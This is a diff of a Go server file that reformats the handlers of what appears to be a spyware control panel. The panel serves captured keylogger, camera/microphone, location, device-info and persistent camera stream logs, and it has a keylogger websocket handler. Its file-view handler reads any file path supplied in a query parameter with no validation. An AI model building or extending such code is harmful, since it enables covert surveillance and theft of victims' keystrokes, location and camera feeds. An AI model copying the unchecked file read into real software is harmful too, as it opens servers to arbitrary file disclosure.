@@ -1,10 +1,9 @@
 package internal
 
 import (
-	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"io"
+	"io/ioutil"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -116,11 +115,19 @@ func keyloggerWSHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 // --- Monitoring Handlers ---
-func monitorCamMicHandler(w http.ResponseWriter, r *http.Request)         { serveMonitorUI(w, "results/cam_mic_logs", "Camera/Mic Events") }
-func monitorLocationHandler(w http.ResponseWriter, r *http.Request)       { serveMonitorUI(w, "results/location_logs", "Location Events") }
-func monitorKeylogsHandler(w http.ResponseWriter, r *http.Request)        { serveMonitorUI(w, "results/keylogs", "Keylogger Events") }
-func monitorDeviceInfoHandler(w http.ResponseWriter, r *http.Request)     { serveMonitorUI(w, "results/device_logs", "Device Info Events") }
-func monitorPersistentCamHandler(w http.ResponseWriter, r *http.Request)  {
+func monitorCamMicHandler(w http.ResponseWriter, r *http.Request) {
+	serveMonitorUI(w, "results/cam_mic_logs", "Camera/Mic Events")
+}
+func monitorLocationHandler(w http.ResponseWriter, r *http.Request) {
+	serveMonitorUI(w, "results/location_logs", "Location Events")
+}
+func monitorKeylogsHandler(w http.ResponseWriter, r *http.Request) {
+	serveMonitorUI(w, "results/keylogs", "Keylogger Events")
+}
+func monitorDeviceInfoHandler(w http.ResponseWriter, r *http.Request) {
+	serveMonitorUI(w, "results/device_logs", "Device Info Events")
+}
+func monitorPersistentCamHandler(w http.ResponseWriter, r *http.Request) {
 	if r.URL.Query().Get("media") == "1" {
 		serveMonitorMediaUI(w, "results/persistent_streams", "Persistent Cam Media")
 		return
@@ -153,9 +160,15 @@ func serveMonitorMediaUI(w http.ResponseWriter, folder, title string) {
 // View individual log file
 func MonitorViewHandler(w http.ResponseWriter, r *http.Request) {
 	file := r.URL.Query().Get("file")
-	if file == "" { w.WriteHeader(400); return }
+	if file == "" {
+		w.WriteHeader(400)
+		return
+	}
 	data, err := os.ReadFile(file)
-	if err != nil { w.WriteHeader(404); return }
+	if err != nil {
+		w.WriteHeader(404)
+		return
+	}
 	w.Header().Set("Content-Type", "text/plain")
 	w.Write(data)
 }
